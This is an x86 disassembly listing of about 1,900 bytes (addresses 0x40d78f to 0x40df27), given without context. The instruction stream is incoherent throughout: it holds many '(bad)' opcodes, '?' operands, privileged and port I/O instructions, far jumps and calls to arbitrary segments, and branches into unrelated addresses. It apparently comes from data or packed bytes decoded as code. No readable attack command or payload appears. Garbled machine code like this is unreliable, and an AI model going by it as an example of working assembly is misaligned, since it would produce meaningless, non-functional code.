  40d78f:	ds push edx
  40d791:	sar    ch,0x9
  40d794:	cwde   
  40d795:	scas   eax,DWORD PTR es:[edi]
  40d796:	in     al,0x27
  40d798:	cwde   
  40d799:	jmp    0xceac4f38
  40d79e:	js     0x40d80f
  40d7a0:	daa    
  40d7a1:	adc    eax,0x80b9c8e3
  40d7a6:	sar    BYTE PTR [ecx],cl
  40d7a8:	cmp    eax,0xd56cfbce
  40d7ad:	out    dx,eax
  40d7ae:	jo     0x40d757
  40d7b0:	adc    al,0x1d
  40d7b2:	push   es
  40d7b3:	mov    dl,0xed
  40d7b5:	retf   
  40d7b6:	enter  0xb540,0xc0
  40d7ba:	push   ds
  40d7bb:	inc    esi
  40d7bc:	mov    ecx,0x811d5c29
  40d7c1:	ficom  WORD PTR [ebx]
  40d7c3:	sub    ebx,DWORD PTR [esi+eax*1]
  40d7c6:	mov    eax,DWORD PTR [eax]
  40d7c8:	mov    BYTE PTR [eax],ch
  40d7ca:	cli    
  40d7cb:	rol    BYTE PTR [ebp+0x27a11f4b],1
  40d7d1:	cs pop eax
  40d7d3:	mov    edi,0x60e99009
  40d7d8:	jb     0x40d829
  40d7da:	adc    BYTE PTR [eax-0x27],ah
  40d7dd:	out    0x11,eax
  40d7df:	(bad)  [edi-0x4b3107ff]
  40d7e5:	mov    ch,0x96
  40d7e7:	pop    edx
  40d7e8:	ss sub al,0xb0
  40d7eb:	stc    
  40d7ec:	jge    0x40d7da
  40d7ee:	jno    0x40d7b9
  40d7f0:	push   ebp
  40d7f1:	mov    cl,cl
  40d7f3:	fxch   st(2)
  40d7f5:	outs   dx,BYTE PTR ds:[esi]
  40d7f6:	sbb    eax,0x1d1c212
  40d7fb:	adc    edi,ebp
  40d7fd:	mov    ebx,0x9d80a533
  40d802:	imul   ecx,DWORD PTR [ecx+edi*1],0x244f2e20
  40d809:	mov    esp,0xc8578d05
  40d80e:	pop    ss
  40d80f:	xchg   esp,eax
  40d810:	and    eax,DWORD PTR ds:0xa04c6707
  40d816:	and    esi,DWORD PTR fs:[edi+esi*2-0x5053fe17]
  40d81e:	and    eax,0x2e106b54
  40d823:	js     0x40d882
  40d825:	add    eax,0x709b86ab
  40d82a:	in     eax,0x62
  40d82c:	int3   
  40d82d:	retf   0x67be
  40d830:	and    ah,BYTE PTR [esi-0x1a]
  40d833:	idiv   dl
  40d835:	daa    
  40d836:	and    al,0xb5
  40d838:	or     ch,ch
  40d83a:	mov    eax,fs
  40d83c:	sub    DWORD PTR [eax],esi
  40d83e:	pop    ebx
  40d83f:	push   edi
  40d840:	mov    eax,0x3fcda38e
  40d845:	mov    eax,ebp
  40d847:	and    bl,BYTE PTR [esi+ebx*1]
  40d84a:	mov    ebp,0x13c097e9
  40d84f:	mov    WORD PTR [ecx],cs
  40d851:	pop    esi
  40d852:	call   0x2844:0x5f32d3fb
  40d859:	add    al,0xbd
  40d85b:	mov    dl,0x5f
  40d85d:	lock repz in eax,dx
  40d860:	xor    al,BYTE PTR [eax]
  40d862:	mov    dl,0x5c
  40d864:	dec    ebx
  40d865:	add    cl,dh
  40d867:	(bad)  
  40d868:	mov    edx,0x9e5e1878
  40d86d:	imul   ebp,DWORD PTR [eax-0x3b799d07],0xffffffb3
  40d874:	pop    eax
  40d875:	sbb    eax,0x962d4cab
  40d87a:	cdq    
  40d87b:	pop    ebx
  40d87c:	jp     0x40d82a
  40d87e:	sub    eax,0xff9e0500
  40d883:	adc    al,0xfb
  40d885:	inc    esi
  40d886:	fistp  WORD PTR [ebx+0x380060d2]
  40d88c:	(bad)  
  40d88d:	int    0x9c
  40d88f:	xor    BYTE PTR [eax],0x18
  40d892:	call   0x3265:0xcb24fb63
  40d899:	fdivr  DWORD PTR ds:0xc88a34d4
  40d89f:	mov    dl,0x70
  40d8a1:	inc    esi
  40d8a2:	clc    
  40d8a3:	mov    edi,0x9ad8efed
  40d8a8:	aam    0x36
  40d8aa:	inc    esp
  40d8ab:	push   0x5f
  40d8ad:	or     ah,bl
  40d8af:	xchg   ebp,eax
  40d8b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8b1:	lock cmp BYTE PTR [ecx],bl
  40d8b4:	inc    esp
  40d8b5:	cmp    edx,eax
  40d8b7:	out    dx,eax
  40d8b8:	and    al,0x7a
  40d8ba:	inc    edi
  40d8bb:	stos   BYTE PTR es:[edi],al
  40d8bc:	rol    DWORD PTR [esi],0xcb
  40d8bf:	cdq    
  40d8c0:	jo     0x40d89b
  40d8c2:	mov    ds:0xd7cea984,eax
  40d8c7:	xlat   BYTE PTR ds:[ebx]
  40d8c8:	fisub  DWORD PTR [ebp-0x70ba277c]
  40d8ce:	(bad)  
  40d8cf:	arpl   WORD PTR [edx],dx
  40d8d1:	jp     0x40d8c3
  40d8d3:	sti    
  40d8d4:	or     ebp,esp
  40d8d6:	and    ebp,DWORD PTR [edx]
  40d8d8:	jmp    0xf3b0:0x27a8c93f
  40d8df:	mov    ebp,0xfff8f3c8
  40d8e4:	int    0xa7
  40d8e6:	aaa    
  40d8e7:	dec    esi
  40d8e8:	add    al,0xa3
  40d8ea:	jae    0x40d93d
  40d8ec:	aas    
  40d8ed:	or     al,BYTE PTR [ebx]
  40d8ef:	pushf  
  40d8f0:	call   0xeeec:0xc5db748a
  40d8f7:	mov    dh,0x92
  40d8f9:	add    BYTE PTR [edi-0x5e75d1ff],0x2d
  40d900:	fmul   DWORD PTR [edx]
  40d902:	dec    esi
  40d903:	in     eax,dx
  40d904:	add    eax,0x7b793adb
  40d909:	cmp    eax,0x80391dd5
  40d90e:	and    al,0x6
  40d910:	jae    0x40d935
  40d912:	xor    al,0xfb
  40d914:	shl    DWORD PTR [edx],cl
  40d916:	nop
  40d917:	fwait
  40d918:	(bad)  
  40d919:	push   0xffffffa2
  40d91b:	into   
  40d91c:	xor    esi,esi
  40d91e:	hlt    
  40d91f:	cdq    
  40d920:	jp     0x40d983
  40d922:	stc    
  40d923:	mov    al,BYTE PTR [edx]
  40d925:	dec    edx
  40d926:	ds push edi
  40d928:	imul   edx,esi,0x599cf517
  40d92e:	or     DWORD PTR [ebp+eax*1+0x17919a5d],eax
  40d935:	ins    DWORD PTR es:[edi],dx
  40d936:	push   cs
  40d937:	pusha  
  40d938:	jl     0x40d915
  40d93a:	repz out 0xd3,eax
  40d93d:	cmp    eax,0xa4b438ac
  40d942:	(bad)  
  40d943:	adc    eax,0x661933e0
  40d948:	mov    esi,esp
  40d94a:	fistp  DWORD PTR [edi-0x53]
  40d94d:	mov    esp,0xfa2cf9f9
  40d952:	push   es
  40d953:	jmp    0x221f:0x830d2555
  40d95a:	repz or ecx,DWORD PTR [ebx]
  40d95d:	dec    ebp
  40d95e:	mov    esp,0xeea86894
  40d963:	jmp    0x8f28:0x67d117b5
  40d96a:	mov    esp,0x62615244
  40d96f:	fbld   TBYTE PTR [edi+0x15]
  40d972:	aad    0x3f
  40d974:	mov    ebp,0xc7e55995
  40d979:	inc    ebx
  40d97a:	loope  0x40d9d2
  40d97c:	mov    ah,0x7d
  40d97e:	(bad)  
  40d97f:	sub    al,0x85
  40d981:	or     ah,ah
  40d983:	or     eax,0xc47e4e90
  40d988:	cmp    al,0xe5
  40d98a:	cld    
  40d98b:	inc    esp
  40d98c:	(bad)  
  40d98d:	xchg   esi,eax
  40d98e:	sub    al,BYTE PTR [ecx+0x54990318]
  40d994:	es push edx
  40d996:	dec    DWORD PTR [ebx-0x30]
  40d999:	inc    esp
  40d99a:	inc    edi
  40d99b:	mov    esp,0x5b88bf13
  40d9a0:	jge    0x40d9d8
  40d9a2:	jge    0x40d9a9
  40d9a4:	arpl   WORD PTR [ecx-0x4d],sp
  40d9a7:	cmp    DWORD PTR [eax+0x46],ebx
  40d9aa:	jns    0x40da16
  40d9ac:	jns    0x40d969
  40d9ae:	mov    WORD PTR ss:[edi],fs
  40d9b1:	in     al,0x34
  40d9b3:	adc    DWORD PTR [ebx+eiz*8+0x24],ecx
  40d9b7:	or     ecx,DWORD PTR [ecx+0x78f9582f]
  40d9bd:	inc    eax
  40d9be:	mov    eax,0xb11a05ed
  40d9c3:	mov    DWORD PTR [esi+0x29a3815d],esp
  40d9c9:	cmc    
  40d9ca:	icebp  
  40d9cb:	sar    DWORD PTR [edi-0x2e],1
  40d9ce:	pushf  
  40d9cf:	xor    eax,0xf8678670
  40d9d4:	sbb    DWORD PTR [edx+0x7],ecx
  40d9d7:	sub    eax,0xdd8e78a0
  40d9dc:	add    DWORD PTR [edx+ebx*1],eax
  40d9df:	mov    edi,0x2b49b5a0
  40d9e4:	popf   
  40d9e5:	sti    
  40d9e6:	mov    ecx,0x9d8a89db
  40d9eb:	mov    bh,0xbc
  40d9ed:	icebp  
  40d9ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9ef:	imul   edx,DWORD PTR [esi-0x56],0x45832745
  40d9f6:	cmp    eax,DWORD PTR [ecx]
  40d9f8:	xchg   edi,eax
  40d9f9:	outs   dx,DWORD PTR ds:[esi]
  40d9fa:	leave  
  40d9fb:	sti    
  40d9fc:	repz fs loop 0x40da0e
  40da00:	jne    0x40da0b
  40da02:	dec    ebp
  40da03:	les    ebp,FWORD PTR [eax]
  40da05:	cmp    BYTE PTR [eax],dl
  40da07:	jle    0x40d9c0
  40da09:	xchg   ecx,eax
  40da0a:	or     BYTE PTR [edx],0x3f
  40da0d:	pop    es
  40da0e:	mov    esi,0xc90c97ec
  40da13:	(bad)  [esi]
  40da15:	jns    0x40da1f
  40da17:	jns    0x40d9d4
  40da19:	jmp    0xce6c:0xf204bc4f
  40da20:	pushf  
  40da21:	popf   
  40da22:	push   esi
  40da23:	leave  
  40da24:	sub    eax,DWORD PTR [ecx+0x79]
  40da27:	jg     0x40d9ea
  40da29:	mov    al,ds:0xaf72471c
  40da2e:	int    0x50
  40da30:	push   edi
  40da31:	add    edx,DWORD PTR [esp+eiz*2-0x6d]
  40da35:	leave  
  40da36:	outs   dx,BYTE PTR ds:[esi]
  40da37:	mov    gs,edi
  40da39:	adc    dl,BYTE PTR [ebp-0x7fcd0451]
  40da3f:	aad    0x8f
  40da41:	dec    ebp
  40da42:	sub    al,0x86
  40da44:	das    
  40da45:	mov    bh,0x28
  40da47:	add    bh,BYTE PTR [eax]
  40da49:	xor    eax,0x3bc49f7a
  40da4e:	inc    ebp
  40da4f:	sbb    bh,al
  40da51:	loop   0x40d9f0
  40da53:	add    eax,ebp
  40da55:	fwait
  40da56:	cmp    al,0x70
  40da58:	ins    DWORD PTR es:[edi],dx
  40da59:	dec    edx
  40da5a:	daa    
  40da5b:	xlat   BYTE PTR ds:[ebx]
  40da5c:	arpl   WORD PTR [ecx],si
  40da5e:	fisub  DWORD PTR [ecx+0x11]
  40da61:	(bad)  
  40da62:	shr    BYTE PTR [ebp-0x6b],0xe
  40da66:	xchg   BYTE PTR [edi],bl
  40da68:	or     bh,bh
  40da6a:	dec    esp
  40da6b:	pop    ds
  40da6c:	xchg   edi,eax
  40da6d:	pusha  
  40da6e:	adc    cl,ch
  40da70:	adc    dh,BYTE PTR [ebp+0x4d]
  40da73:	inc    ebp
  40da74:	test   BYTE PTR [ecx-0x686b7426],bh
  40da7a:	push   ss
  40da7b:	(bad)  
  40da7c:	aad    0x7f
  40da7e:	lock mov ch,0x22
  40da81:	ficomp WORD PTR [ebx]
  40da83:	jg     0x40daaa
  40da85:	or     al,0x19
  40da87:	cmp    esi,DWORD PTR [edx-0x2a]
  40da8a:	adc    al,0x9c
  40da8c:	popf   
  40da8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da8e:	add    DWORD PTR [edx],esi
  40da90:	retf   
  40da91:	mov    DWORD PTR [edx+0x34],ecx
  40da94:	ja     0x40da76
  40da96:	(bad)  
  40da97:	fsubr  st(4),st
  40da99:	adc    al,0xfc
  40da9b:	push   eax
  40da9c:	pop    ecx
  40da9d:	loope  0x40da25
  40da9f:	jno    0x40da51
  40daa1:	pop    ss
  40daa2:	(bad)  
  40daa3:	cs jo  0x40da44
  40daa6:	jae    0x40dacb
  40daa8:	xchg   esi,eax
  40daa9:	fwait
  40daaa:	cli    
  40daab:	jle    0x40da59
  40daad:	in     eax,dx
  40daae:	pop    ss
  40daaf:	push   es
  40dab0:	adc    esi,DWORD PTR [eax-0x2d63fb5a]
  40dab6:	pop    eax
  40dab7:	fnstenv [eax-0x7a]
  40daba:	nop
  40dabb:	dec    ebp
  40dabc:	ret    0xdecd
  40dabf:	push   0x27
  40dac1:	ret    
  40dac2:	inc    edx
  40dac3:	adc    DWORD PTR [edx+0x2fff120f],ebx
  40dac9:	mov    ebp,0xde66888e
  40dace:	ret    
  40dacf:	fist   DWORD PTR [ecx+0x5e]
  40dad2:	inc    ebx
  40dad3:	sbb    eax,DWORD PTR [ebx]
  40dad5:	push   edx
  40dad7:	stos   BYTE PTR es:[edi],al
  40dad8:	dec    ecx
  40dad9:	or     bh,BYTE PTR [esi+eax*4]
  40dadc:	lods   eax,DWORD PTR ss:[esi]
  40dade:	icebp  
  40dadf:	jae    0x40daba
  40dae1:	mov    edi,0xa7e2c27c
  40dae6:	jl     0x40db1e
  40dae8:	ret    0x9914
  40daeb:	mov    BYTE PTR [esi+eiz*1-0xd39153b],ch
  40daf2:	push   ds
  40daf3:	stc    
  40daf4:	mov    ah,BYTE PTR [ecx+0x71]
  40daf7:	cli    
  40daf8:	iret   
  40daf9:	push   ebp
  40dafa:	int3   
  40dafb:	push   edx
  40dafc:	hlt    
  40dafd:	icebp  
  40dafe:	icebp  
  40daff:	mov    dl,0xe7
  40db01:	sub    cl,BYTE PTR [ebp-0x2]
  40db04:	sbb    al,BYTE PTR [esi+0x22]
  40db07:	mov    DWORD PTR [esi-0x22],esi
  40db0a:	stos   DWORD PTR es:[edi],eax
  40db0b:	vhaddps ymm6,ymm5,YMMWORD PTR [ecx+ecx*2+0x2a0282e3]
  40db14:	jne    0x186bb011
  40db1a:	addr16 addr16 adc eax,0x9d1d6652
  40db21:	inc    BYTE PTR [edx+eiz*4]
  40db24:	or     al,0xe1
  40db26:	pop    edx
  40db27:	int    0x33
  40db29:	sar    DWORD PTR [edx],1
  40db2b:	neg    BYTE PTR [edi+eax*2+0x58b788b8]
  40db32:	jg     0x40db44
  40db34:	mov    ebp,esi
  40db36:	mov    ds:0xd56dfb7,eax
  40db3b:	sbb    eax,0xefcf41d8
  40db40:	mov    ss:0x5a9e01f3,al
  40db46:	mov    al,ds:0xfc2b4b53
  40db4b:	cmp    DWORD PTR [edi+0x64552056],0x39328112
  40db55:	nop
  40db56:	push   edx
  40db57:	jge    0x40dbaa
  40db59:	push   ebx
  40db5a:	sti    
  40db5b:	sbb    ecx,ecx
  40db5d:	xchg   BYTE PTR ds:0xf43689af,bl
  40db63:	rcr    esi,cl
  40db65:	pop    DWORD PTR [edi-0x1086a43]
  40db6b:	mov    ?,WORD PTR [eax+0x7c]
  40db6e:	in     al,0x4f
  40db70:	ret    0xdd87
  40db73:	test   BYTE PTR [edx+0x54],ch
  40db76:	and    al,0x3b
  40db78:	pop    ecx
  40db79:	leave  
  40db7a:	sbb    al,BYTE PTR ds:0x94d1e124
  40db80:	sahf   
  40db81:	push   eax
  40db82:	std    
  40db83:	out    0x7,al
  40db85:	or     eax,0x914e5200
  40db8a:	mov    esp,0x629281a8
  40db8f:	retf   0xc802
  40db92:	jnp    0x40db1c
  40db94:	into   
  40db95:	mov    eax,0x5bb66358
  40db9a:	pop    ss
  40db9b:	and    eax,0x4b3db20e
  40dba0:	in     al,0xdf
  40dba2:	sbb    DWORD PTR [edi+0x64],0x58
  40dba6:	sbb    BYTE PTR [ecx+0x78316cb6],bh
  40dbac:	int    0x85
  40dbae:	sbb    bh,BYTE PTR [edi+0x4c78ecb9]
  40dbb4:	clc    
  40dbb5:	mov    ds:0x9d67bdf9,eax
  40dbba:	syscall 
  40dbbc:	test   al,0x48
  40dbbe:	and    cl,BYTE PTR [edi-0x2ce5fb47]
  40dbc4:	and    edi,DWORD PTR [edi]
  40dbc6:	(bad)  
  40dbc7:	mov    eax,ds:0x22f60f1b
  40dbcc:	fsubp  st(0),st
  40dbce:	sbb    DWORD PTR [eax+0x9],ecx
  40dbd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbd2:	push   ecx
  40dbd3:	aam    0x8a
  40dbd5:	inc    edx
  40dbd6:	mov    eax,ds:0xa877a8e8
  40dbdb:	jmp    0xef74056d
  40dbe0:	test   eax,0x9b8ccc0e
  40dbe5:	xchg   ebx,eax
  40dbe6:	mov    esp,0xa76b9a
  40dbeb:	adc    esp,DWORD PTR [esi+0x3b]
  40dbee:	(bad)  
  40dbef:	jmp    0xd9ca9a8
  40dbf4:	add    BYTE PTR [ebx],ah
  40dbf6:	in     al,dx
  40dbf7:	test   BYTE PTR [eax],bl
  40dbf9:	fwait
  40dbfa:	jmp    0x9d2c4fcf
  40dbff:	rcr    ah,cl
  40dc01:	cwde   
  40dc02:	icebp  
  40dc03:	cmp    DWORD PTR [ecx+0x217d0c2d],0x774de4fe
  40dc0d:	xchg   DWORD PTR [ecx],eax
  40dc0f:	or     eax,0xdf524132
  40dc14:	push   0xffffff98
  40dc16:	xchg   edi,eax
  40dc17:	xchg   ebp,eax
  40dc18:	sub    DWORD PTR [eax],edx
  40dc1a:	sub    ecx,DWORD PTR [eax]
  40dc1c:	xor    dh,0x2c
  40dc1f:	jmp    0x40dc88
  40dc21:	arpl   WORD PTR [edx-0x40db948],di
  40dc27:	push   ebp
  40dc28:	lods   al,BYTE PTR ds:[esi]
  40dc29:	jp     0x40dc91
  40dc2b:	push   cs
  40dc2c:	ins    DWORD PTR es:[edi],dx
  40dc2d:	xor    DWORD PTR [edi-0x1],eax
  40dc30:	inc    ebx
  40dc31:	inc    eax
  40dc32:	lods   eax,DWORD PTR ds:[esi]
  40dc33:	cs inc esi
  40dc35:	cs sti 
  40dc37:	or     dl,BYTE PTR [eax-0x28a49b69]
  40dc3d:	and    esp,DWORD PTR [ecx-0x4]
  40dc40:	bound  ebx,QWORD PTR [ecx+0x33b9b125]
  40dc46:	dec    edi
  40dc47:	inc    ecx
  40dc48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc49:	lods   al,BYTE PTR ds:[esi]
  40dc4a:	pop    edx
  40dc4b:	push   eax
  40dc4c:	mov    BYTE PTR [ebp-0x2f],bl
  40dc4f:	imul   esp,DWORD PTR [ebp+0x65221ea1],0x74ef17e5
  40dc59:	or     BYTE PTR [ebp-0x74],cl
  40dc5c:	and    edi,edx
  40dc5e:	or     edi,DWORD PTR [ebx-0x4b]
  40dc61:	dec    edx
  40dc62:	pop    edi
  40dc63:	sar    DWORD PTR [esp+esi*4],1
  40dc66:	test   DWORD PTR [edi],eax
  40dc68:	pop    esp
  40dc69:	and    DWORD PTR [eax+edi*1-0x2a],0xfffffffc
  40dc6e:	xor    edi,DWORD PTR [ebp+0x35b39c93]
  40dc74:	pop    edi
  40dc75:	je     0x40dcad
  40dc77:	push   ds
  40dc78:	dec    ebx
  40dc79:	clc    
  40dc7a:	push   esp
  40dc7b:	mov    edi,cr4
  40dc7e:	adc    dh,BYTE PTR [esp+ebx*8-0xe8c2608]
  40dc85:	or     DWORD PTR [edx],0x333eba28
  40dc8b:	add    BYTE PTR [eax+0x58],bl
  40dc8e:	jecxz  0x40dc67
  40dc90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc91:	in     al,0xc6
  40dc93:	stos   DWORD PTR es:[edi],eax
  40dc94:	adc    al,0xb0
  40dc96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc97:	push   ebx
  40dc98:	and    eax,0xfc6dc18c
  40dc9d:	mov    al,0x69
  40dc9f:	arpl   WORD PTR ds:0x50b0650a,bx
  40dca5:	shr    DWORD PTR [ebp+0x62],0xe3
  40dca9:	dec    ebx
  40dcaa:	dec    edx
  40dcab:	lods   eax,DWORD PTR ds:[esi]
  40dcac:	sahf   
  40dcad:	cli    
  40dcae:	push   ds
  40dcaf:	dec    edx
  40dcb0:	out    0x34,al
  40dcb2:	lahf   
  40dcb3:	repz and bh,BYTE PTR [ebx+0x1ff1d89d]
  40dcba:	pop    ebp
  40dcbb:	and    al,ah
  40dcbd:	outs   dx,DWORD PTR ds:[esi]
  40dcbe:	jle    0x40dcf3
  40dcc0:	adc    al,0x8f
  40dcc2:	loope  0x40dcad
  40dcc4:	cmp    DWORD PTR ds:0x7bd9810d,esi
  40dcca:	push   ebx
  40dccb:	xchg   edx,eax
  40dccc:	loop   0x40dc55
  40dcce:	retf   0xb17c
  40dcd1:	jb     0x40dcd3
  40dcd3:	jno    0x40dd45
  40dcd5:	mov    BYTE PTR [edx+0x5a3e6618],0x92
  40dcdc:	mov    ds:0xc66cf9fa,eax
  40dce1:	int3   
  40dce2:	cmp    ebp,DWORD PTR [esi]
  40dce4:	adc    al,0x13
  40dce6:	mov    bh,0x61
  40dce8:	ret    
  40dce9:	repz sub eax,0x71beb4c
  40dcef:	sti    
  40dcf0:	popa   
  40dcf1:	call   0xd79da776
  40dcf6:	call   0x4426:0xd754819e
  40dcfd:	mov    edx,esi
  40dcff:	push   esi
  40dd00:	mov    ebp,0xc7ed0dd
  40dd05:	xchg   ebp,eax
  40dd06:	popa   
  40dd07:	cmp    BYTE PTR [ebx+0x5e14b137],dh
  40dd0d:	aad    0xb9
  40dd0f:	add    bh,dl
  40dd11:	cs jnp 0x40dce9
  40dd14:	jl     0x40dd6b
  40dd16:	clc    
  40dd17:	inc    eax
  40dd18:	std    
  40dd19:	dec    esp
  40dd1a:	icebp  
  40dd1b:	mov    BYTE PTR [ebx],cl
  40dd1d:	sar    BYTE PTR [ecx],1
  40dd1f:	(bad)  
  40dd21:	shl    DWORD PTR [edi+0x3d43102d],0xc
  40dd28:	sahf   
  40dd29:	cld    
  40dd2a:	mov    ch,0x9d
  40dd2c:	cmp    al,0xd6
  40dd2e:	in     eax,0xdf
  40dd30:	imul   ebx,DWORD PTR [ecx]
  40dd33:	mov    ch,0x52
  40dd35:	ficomp DWORD PTR [edi-0x5038c69f]
  40dd3b:	out    dx,eax
  40dd3c:	ds dec ebx
  40dd3e:	daa    
  40dd3f:	imul   edi,ebx,0xffffff94
  40dd42:	or     edx,ebx
  40dd44:	nop
  40dd45:	mov    eax,ss
  40dd47:	push   ebx
  40dd48:	mov    ecx,0x7fe05197
  40dd4d:	data16 je 0x40ddaf
  40dd50:	or     BYTE PTR [esi+esi*4],bh
  40dd53:	mov    esi,0xb183a0e9
  40dd58:	sti    
  40dd59:	add    esi,DWORD PTR [ebx]
  40dd5b:	jle    0x40dd42
  40dd5d:	fnstenv [edi]
  40dd5f:	xor    DWORD PTR [esi-0x6897020],ebx
  40dd65:	je     0x40dd84
  40dd67:	retf   0x4cae
  40dd6a:	out    dx,al
  40dd6b:	and    edx,esi
  40dd6d:	arpl   cx,dx
  40dd6f:	lods   eax,DWORD PTR ds:[esi]
  40dd70:	in     al,dx
  40dd71:	sub    BYTE PTR [edx-0x2d],0x52
  40dd75:	std    
  40dd76:	aad    0x6f
  40dd78:	sahf   
  40dd79:	adc    DWORD PTR [esp+eiz*4-0x47340bd4],esp
  40dd80:	jne    0x40dda8
  40dd82:	mov    esp,0xabf8a6d4
  40dd87:	dec    ecx
  40dd88:	das    
  40dd89:	ins    BYTE PTR es:[edi],dx
  40dd8a:	data16 sub ah,BYTE PTR [esi]
  40dd8d:	xchg   edi,eax
  40dd8e:	push   cs
  40dd8f:	in     eax,0x5b
  40dd91:	jl     0x40dd6c
  40dd93:	nop
  40dd94:	adc    eax,0x8bea88f0
  40dd99:	mov    ebp,0x4673fcee
  40dd9e:	xor    dl,bl
  40dda0:	inc    ebp
  40dda1:	leave  
  40dda2:	ins    BYTE PTR es:[edi],dx
  40dda3:	xor    ecx,DWORD PTR [edi-0x5cc5bfde]
  40dda9:	popf   
  40ddaa:	push   ss
  40ddab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddac:	dec    edi
  40ddad:	out    0xa4,eax
  40ddaf:	jg     0x40ddd2
  40ddb1:	mov    WORD PTR [ecx+0x27],?
  40ddb4:	popf   
  40ddb5:	lea    edi,[esi+0x504dfbcf]
  40ddbb:	js     0x40de23
  40ddbd:	cli    
  40ddbe:	cmp    BYTE PTR [ebx-0x28d07141],0xb2
  40ddc5:	mov    WORD PTR [edi-0x4c260f7a],?
  40ddcb:	mov    esi,0x9ad880dc
  40ddd0:	(bad)  
  40ddd1:	retf   0xc7ee
  40ddd4:	test   eax,0x160c5fc8
  40ddd9:	call   DWORD PTR [ebx-0x6ab24351]
  40dddf:	mov    ds,edx
  40dde1:	nop
  40dde2:	or     BYTE PTR [esi-0x18f907e3],bh
  40dde8:	int3   
  40dde9:	das    
  40ddea:	cdq    
  40ddeb:	xor    DWORD PTR [ecx],edx
  40dded:	xchg   edx,eax
  40ddee:	add    esi,DWORD PTR [esi-0x1]
  40ddf1:	mov    ds:0xb3ee6e96,al
  40ddf6:	int    0x4a
  40ddf8:	pop    ebx
  40ddf9:	icebp  
  40ddfa:	in     eax,0xb6
  40ddfc:	mov    ds:0xa52cb8ba,al
  40de01:	jge    0x40ddfc
  40de03:	ja     0x40dd86
  40de05:	mov    cs,eax
  40de07:	xchg   BYTE PTR ss:0x262f5c7f,bh
  40de0e:	cmp    al,BYTE PTR [ebp+0x40]
  40de11:	xchg   BYTE PTR [esi+0x57cd700f],ch
  40de17:	fs je  0x40ddac
  40de1a:	inc    eax
  40de1b:	and    DWORD PTR [ebx],edi
  40de1d:	clc    
  40de1e:	mov    cl,0x7c
  40de20:	mov    edi,0x50361180
  40de25:	fmul   QWORD PTR fs:[edi-0x7]
  40de29:	in     al,0x5c
  40de2b:	les    ebx,FWORD PTR [esi-0x52]
  40de2e:	dec    ecx
  40de2f:	ins    DWORD PTR es:[edi],dx
  40de30:	out    0x4d,al
  40de32:	outs   dx,DWORD PTR ds:[esi]
  40de33:	jmp    0x7822:0xbebd1861
  40de3a:	leave  
  40de3b:	stos   BYTE PTR es:[edi],al
  40de3c:	push   0x7
  40de3e:	adc    al,0x95
  40de41:	and    DWORD PTR [edi-0x499ce403],edi
  40de47:	jle    0x40de41
  40de49:	nop
  40de4a:	pop    eax
  40de4b:	add    BYTE PTR [eax+0x23],ch
  40de4e:	nop
  40de4f:	cld    
  40de50:	fadd   QWORD PTR [esi+0x38c50f75]
  40de56:	add    ecx,DWORD PTR [esi+0xb96d72c]
  40de5c:	std    
  40de5d:	sub    bh,cl
  40de5f:	sti    
  40de60:	push   0xfffffff6
  40de62:	dec    edi
  40de63:	fcom   st(5)
  40de65:	pop    ds
  40de66:	mov    ?,WORD PTR gs:[ebx+0xf]
  40de6a:	push   esp
  40de6b:	xor    eax,0x6ce5925f
  40de70:	out    0xe5,al
  40de72:	retf   0xdf63
  40de75:	ja     0x40deed
  40de77:	mul    BYTE PTR ds:0x16287a9
  40de7d:	mov    BYTE PTR [eax-0x5d],al
  40de80:	out    0xb8,al
  40de82:	fnclex 
  40de84:	lods   eax,DWORD PTR ds:[esi]
  40de85:	xchg   ebp,eax
  40de86:	cli    
  40de87:	xchg   BYTE PTR [esi-0x74],ch
  40de8a:	mov    ebx,?
  40de8c:	(bad)  
  40de8d:	rep lods eax,DWORD PTR ds:[esi]
  40de8f:	jmp    0x40de2d
  40de91:	and    al,0xcb
  40de93:	shl    DWORD PTR [ebp-0x6152c676],cl
  40de99:	sub    BYTE PTR [ecx+eiz*4-0x3],dl
  40de9d:	jno    0x40debf
  40de9f:	int3   
  40dea0:	sbb    ch,BYTE PTR [ecx+ebp*1]
  40dea3:	adc    eax,0xad9a76f5
  40dea8:	imul   ebp,ebx,0xe93c91c9
  40deae:	jecxz  0x40df14
  40deb0:	mov    ebx,0x412abc0a
  40deb5:	ror    DWORD PTR [esi],cl
  40deb7:	xor    eax,0x4384f038
  40debc:	mov    dl,0x72
  40debe:	pop    ebx
  40debf:	push   ss
  40dec0:	test   DWORD PTR [edx+0x6],esi
  40dec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dec4:	mov    dl,0x79
  40dec6:	push   es
  40dec7:	or     eax,0xe8de908b
  40decc:	add    bh,ah
  40dece:	ds cmc 
  40ded0:	shr    BYTE PTR [edx-0x2fa770a6],1
  40ded6:	mov    cl,0x86
  40ded8:	jmp    0x40df50
  40deda:	mov    DWORD PTR [edi+0xb588e09],eax
  40dee0:	int    0x88
  40dee2:	inc    ecx
  40dee3:	xor    BYTE PTR [edi+0x676ba8b9],ah
  40dee9:	outs   dx,BYTE PTR ds:[esi]
  40deea:	sub    dl,dh
  40deec:	cmp    DWORD PTR [edi],esi
  40deee:	xor    al,0x25
  40def0:	cmp    al,BYTE PTR [esi+0x52]
  40def3:	cli    
  40def4:	xchg   al,dh
  40def6:	jmp    0x2e1a00ba
  40defb:	stos   DWORD PTR es:[edi],eax
  40defc:	pop    ss
  40defd:	repnz pop esi
  40deff:	jb     0x40df3b
  40df01:	mov    ecx,0xf6cb0d47
  40df06:	inc    edi
  40df07:	ss sub edx,esp
  40df0a:	loopne 0x40df62
  40df0c:	enter  0x78e9,0xb7
  40df10:	xchg   edi,eax
  40df11:	movd   mm0,DWORD PTR [ebx-0x66]
  40df15:	jne    0x40dea0
  40df17:	dec    esi
  40df18:	sbb    bl,BYTE PTR [ecx-0x9]
  40df1b:	arpl   WORD PTR [eax+0x17],dx
  40df1e:	pop    esi
  40df1f:	test   eax,0x3d89063f
  40df24:	inc    edx
  40df25:	push   esi
  40df26:	clc    
  40df27:	imul   edi,DWORD PTR [edi+edx*2-0x5],0xffffff90
